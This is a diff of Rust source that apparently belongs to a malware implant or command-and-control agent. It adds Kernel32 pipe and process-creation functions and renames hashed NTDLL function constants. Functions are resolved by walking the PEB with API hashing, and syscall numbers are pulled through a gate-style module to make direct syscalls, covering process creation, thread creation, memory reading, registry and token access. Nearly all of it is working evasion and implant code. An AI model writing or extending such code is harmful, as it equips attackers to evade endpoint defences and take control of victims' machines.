@@ -10,6 +10,7 @@ use core::sync::atomic::{AtomicBool, Ordering};
 use core::{cell::UnsafeCell, ptr::null_mut};
 use ldr::{ldr_function_addr, ldr_module_peb, nt_current_teb};
 use mod_hhtgates::get_syscall_number;
+use rs2_win32::kernel32::Kernel32;
 use spin::Mutex;
 
 use rs2_win32::ntapi::NtDll;
@@ -99,6 +100,7 @@ pub struct Instance {
     pub config: Config,
     /// Pointer to Checkin Data
     pub pcheckindata: *mut c_void,
+    pub kernel32: Kernel32,
 }
 
 impl Instance {
@@ -111,6 +113,7 @@ impl Instance {
             session: Session::new(),
             config: Config::new(),
             pcheckindata: null_mut(),
+            kernel32: Kernel32::new(),
         }
     }
 
@@ -163,145 +166,203 @@ unsafe fn init_global_instance() {
     // Check if initialization has already occurred.
     if !INIT_INSTANCE.load(Ordering::Acquire) {
         // Hashes and function addresses for various NTDLL functions
-        const NTDLL_HASH: u32 = 0x1edab0ed;
+        const KERNEL32_H: u32 = 0x6ddb9555;
+        const CREATE_PIPE_H: usize = 0x9694e9e7;
+        const WRITE_FILE_H: usize = 0xf1d207d0;
+        const READ_FILE_H: usize = 0x84d15061;
+        const CREATE_PROCESS_W_H: usize = 0xfbaf90cf;
+        const GET_CONSOLE_WINDOW_H: usize = 0xc2c4270;
 
-        pub const LDR_LOAD_DLL_DBJ2: usize = 0x9e456a43;
-        pub const RTLCREATEPROCESSPARAMETERSEX_DBJ2: usize = 0x533a05db;
-        const NT_ALLOCATE_VIRTUAL_MEMORY: usize = 0xf783b8ec;
-        const NT_FREE_VIRTUAL_MEMORY: usize = 0x2802c609;
+        const NTDLL_H: u32 = 0x1edab0ed;
+        const LDR_LOAD_DLL_H: usize = 0x9e456a43;
+        const RTL_CREATE_PROCESS_PARAMETERS_EX_H: usize = 0x533a05db;
 
-        const NT_TERMINATE_THREAD: usize = 0xccf58808;
-        const NT_TERMINATE_PROCESS: usize = 0x4ed9dd4f;
-
-        const NT_CLOSE: usize = 0x40d6e69d;
-        const NT_OPEN_KEY: usize = 0x7682ed42;
-        const NT_QUERY_VALUE_KEY: usize = 0x85967123;
-        const NT_ENUMERATE_KEY: usize = 0x4d8a8976;
-        const NT_QUERY_INFORMATION_PROCESS: usize = 0x8cdc5dc2;
-        const NT_QUERY_INFORMATION_TOKEN: usize = 0xf371fe4;
-        const NT_OPEN_PROCESS_TOKEN_TOKEN: usize = 0x350dca99;
-        const NT_DELAY_EXECUTION_TOKEN: usize = 0xf5a936aa;
-
-        const NT_CREATE_THREAD_EX_TOKEN: usize = 0xaf18cfb0;
-        const NT_WAIT_FOR_SINGLE_OBJECT_TOKEN: usize = 0xe8ac0c3c;
-        const NT_OPEN_PROCESS_TOKEN: usize = 0x4b82f718;
-        const NT_CREATE_USER_PROCESS_TOKEN: usize = 0x54ce5f79;
+        const NT_ALLOCATE_VIRTUAL_MEMORY_H: usize = 0xf783b8ec;
+        const NT_FREE_VIRTUAL_MEMORY_H: usize = 0x2802c609;
+        const NT_TERMINATE_THREAD_H: usize = 0xccf58808;
+        const NT_TERMINATE_PROCESS_H: usize = 0x4ed9dd4f;
+        const NT_CLOSE_H: usize = 0x40d6e69d;
+        const NT_OPEN_KEY_H: usize = 0x7682ed42;
+        const NT_QUERY_VALUE_KEY_H: usize = 0x85967123;
+        const NT_ENUMERATE_KEY_H: usize = 0x4d8a8976;
+        const NT_QUERY_INFORMATION_PROCESS_H: usize = 0x8cdc5dc2;
+        const NT_QUERY_INFORMATION_TOKEN_H: usize = 0xf371fe4;
+        const NT_OPEN_PROCESS_TOKEN_H: usize = 0x350dca99;
+        const NT_DELAY_EXECUTION_H: usize = 0xf5a936aa;
+        const NT_CREATE_THREAD_EX_H: usize = 0xaf18cfb0;
+        const NT_WAIT_FOR_SINGLE_OBJECT_H: usize = 0xe8ac0c3c;
+        const NT_OPEN_PROCESS_H: usize = 0x4b82f718;
+        const NT_CREATE_USER_PROCESS_H: usize = 0x54ce5f79;
+        const NT_CREATE_NAMED_PIPE_FILE_H: usize = 0x1da0062e;
+        const NT_OPEN_FILE_H: usize = 0x46dde739;
+        // const NT_WRITE_VIRTUAL_MEMORY_H: usize = 0xc3170192;
+        const NT_READ_VIRTUAL_MEMORY_H: usize = 0xa3288103;
+        const NT_CREATE_PROCESS_H: usize = 0xf043985a;
 
         let mut instance = Instance::new();
 
         instance.kdata = 0x7FFE0000 as *mut KUserSharedData;
         instance.teb = nt_current_teb();
 
-        // Resolve NTDLL functions
-        instance.ntdll.module_base = ldr_module_peb(NTDLL_HASH);
+        // Resolve Ntdll base address
+        instance.ntdll.module_base = ldr_module_peb(NTDLL_H);
+
+        // Resolve Kernel32 base address
+        instance.kernel32.module_base = ldr_module_peb(KERNEL32_H);
+
+        // Resolve CreatePipe
+        let create_pipe_addr = ldr_function_addr(instance.kernel32.module_base, CREATE_PIPE_H);
+        instance.kernel32.create_pipe = core::mem::transmute(create_pipe_addr);
+
+        // Resolve WriteFile
+        let write_file_addr = ldr_function_addr(instance.kernel32.module_base, WRITE_FILE_H);
+        instance.kernel32.write_file = core::mem::transmute(write_file_addr);
+
+        // Resolve ReadFile
+        let read_file_addr = ldr_function_addr(instance.kernel32.module_base, READ_FILE_H);
+        instance.kernel32.read_file = core::mem::transmute(read_file_addr);
+
+        // Resolve CreateProcessW
+        let create_process_w_addr =
+            ldr_function_addr(instance.kernel32.module_base, CREATE_PROCESS_W_H);
+        instance.kernel32.create_process_w = core::mem::transmute(create_process_w_addr);
+
+        // Resolve CreateProcessW
+        let get_console_window_addr =
+            ldr_function_addr(instance.kernel32.module_base, GET_CONSOLE_WINDOW_H);
+        instance.kernel32.get_console_window = core::mem::transmute(get_console_window_addr);
 
         // Resolve LdrLoadDll
-        let ldr_load_dll_addr = ldr_function_addr(instance.ntdll.module_base, LDR_LOAD_DLL_DBJ2);
+        let ldr_load_dll_addr = ldr_function_addr(instance.ntdll.module_base, LDR_LOAD_DLL_H);
         instance.ntdll.ldr_load_dll = core::mem::transmute(ldr_load_dll_addr);
 
         // Resolve LdrLoadDll
         let rtl_create_process_parameters_ex_addr = ldr_function_addr(
             instance.ntdll.module_base,
-            RTLCREATEPROCESSPARAMETERSEX_DBJ2,
+            RTL_CREATE_PROCESS_PARAMETERS_EX_H,
         );
         instance.ntdll.rtl_create_process_parameters_ex =
             core::mem::transmute(rtl_create_process_parameters_ex_addr);
 
         // NtAllocateVirtualMemory
         instance.ntdll.nt_allocate_virtual_memory.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_ALLOCATE_VIRTUAL_MEMORY);
+            ldr_function_addr(instance.ntdll.module_base, NT_ALLOCATE_VIRTUAL_MEMORY_H);
         instance.ntdll.nt_allocate_virtual_memory.syscall.number =
             get_syscall_number(instance.ntdll.nt_allocate_virtual_memory.syscall.address);
 
         // NtFreeVirtualMemory
         instance.ntdll.nt_free_virtual_memory.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_FREE_VIRTUAL_MEMORY);
+            ldr_function_addr(instance.ntdll.module_base, NT_FREE_VIRTUAL_MEMORY_H);
         instance.ntdll.nt_free_virtual_memory.syscall.number =
             get_syscall_number(instance.ntdll.nt_free_virtual_memory.syscall.address);
 
         // NtTerminateThread
         instance.ntdll.nt_terminate_thread.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_THREAD);
+            ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_THREAD_H);
         instance.ntdll.nt_terminate_thread.syscall.number =
             get_syscall_number(instance.ntdll.nt_terminate_thread.syscall.address);
 
         // NtTerminateProcess
         instance.ntdll.nt_terminate_process.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_PROCESS);
+            ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_PROCESS_H);
         instance.ntdll.nt_terminate_process.syscall.number =
             get_syscall_number(instance.ntdll.nt_terminate_process.syscall.address);
 
         // NtClose
         instance.ntdll.nt_close.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_CLOSE);
+            ldr_function_addr(instance.ntdll.module_base, NT_CLOSE_H);
         instance.ntdll.nt_close.syscall.number =
             get_syscall_number(instance.ntdll.nt_close.syscall.address);
 
         // NtOpenKey
         instance.ntdll.nt_open_key.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_KEY);
+            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_KEY_H);
         instance.ntdll.nt_open_key.syscall.number =
             get_syscall_number(instance.ntdll.nt_open_key.syscall.address);
 
         // NtQueryValueKey
         instance.ntdll.nt_query_value_key.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_VALUE_KEY);
+            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_VALUE_KEY_H);
         instance.ntdll.nt_query_value_key.syscall.number =
             get_syscall_number(instance.ntdll.nt_query_value_key.syscall.address);
 
         // NtEnumerateKey
         instance.ntdll.nt_enumerate_key.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_ENUMERATE_KEY);
+            ldr_function_addr(instance.ntdll.module_base, NT_ENUMERATE_KEY_H);
         instance.ntdll.nt_enumerate_key.syscall.number =
             get_syscall_number(instance.ntdll.nt_enumerate_key.syscall.address);
 
         // NtQueryInformationProccess
         instance.ntdll.nt_query_information_process.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_PROCESS);
+            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_PROCESS_H);
         instance.ntdll.nt_query_information_process.syscall.number =
             get_syscall_number(instance.ntdll.nt_query_information_process.syscall.address);
 
         // NtOpenProcess
         instance.ntdll.nt_open_process.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN);
+            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_H);
         instance.ntdll.nt_open_process.syscall.number =
             get_syscall_number(instance.ntdll.nt_open_process.syscall.address);
 
         // NtOpenProcessToken
         instance.ntdll.nt_open_process_token.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN_TOKEN);
+            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN_H);
         instance.ntdll.nt_open_process_token.syscall.number =
             get_syscall_number(instance.ntdll.nt_open_process_token.syscall.address);
 
         // NtQueryInformationToken
         instance.ntdll.nt_query_information_token.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_TOKEN);
+            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_TOKEN_H);
         instance.ntdll.nt_query_information_token.syscall.number =
             get_syscall_number(instance.ntdll.nt_query_information_token.syscall.address);
 
         // NtDelayExecution
         instance.ntdll.nt_delay_execution.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_DELAY_EXECUTION_TOKEN);
+            ldr_function_addr(instance.ntdll.module_base, NT_DELAY_EXECUTION_H);
         instance.ntdll.nt_delay_execution.syscall.number =
             get_syscall_number(instance.ntdll.nt_delay_execution.syscall.address);
 
         // NtCreateThreadEx
         instance.ntdll.nt_create_thread_ex.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_THREAD_EX_TOKEN);
+            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_THREAD_EX_H);
         instance.ntdll.nt_create_thread_ex.syscall.number =
             get_syscall_number(instance.ntdll.nt_create_thread_ex.syscall.address);
 
         // NtWaitForSingleObject
         instance.ntdll.nt_wait_for_single_object.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_WAIT_FOR_SINGLE_OBJECT_TOKEN);
+            ldr_function_addr(instance.ntdll.module_base, NT_WAIT_FOR_SINGLE_OBJECT_H);
         instance.ntdll.nt_wait_for_single_object.syscall.number =
             get_syscall_number(instance.ntdll.nt_wait_for_single_object.syscall.address);
 
         // NtCreateUserProcess
         instance.ntdll.nt_create_user_process.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_USER_PROCESS_TOKEN);
+            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_USER_PROCESS_H);
         instance.ntdll.nt_create_user_process.syscall.number =
             get_syscall_number(instance.ntdll.nt_create_user_process.syscall.address);
+
+        // NtCreateNamedPipeFile
+        instance.ntdll.nt_create_named_pipe_file.syscall.address =
+            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_NAMED_PIPE_FILE_H);
+        instance.ntdll.nt_create_named_pipe_file.syscall.number =
+            get_syscall_number(instance.ntdll.nt_create_named_pipe_file.syscall.address);
+
+        // NtOpenFile
+        instance.ntdll.nt_open_file.syscall.address =
+            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_FILE_H);
+        instance.ntdll.nt_open_file.syscall.number =
+            get_syscall_number(instance.ntdll.nt_open_file.syscall.address);
+
+        // NtReadVirtualMemory
+        instance.ntdll.nt_read_virtual_memory.syscall.address =
+            ldr_function_addr(instance.ntdll.module_base, NT_READ_VIRTUAL_MEMORY_H);
+        instance.ntdll.nt_read_virtual_memory.syscall.number =
+            get_syscall_number(instance.ntdll.nt_read_virtual_memory.syscall.address);
+
+        // NtCreateProcess
+        instance.ntdll.nt_create_process.syscall.address =
+            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_PROCESS_H);
+        instance.ntdll.nt_create_process.syscall.number =
+            get_syscall_number(instance.ntdll.nt_create_process.syscall.address);
 
         // Init Session Data
         instance.session.connected = false;
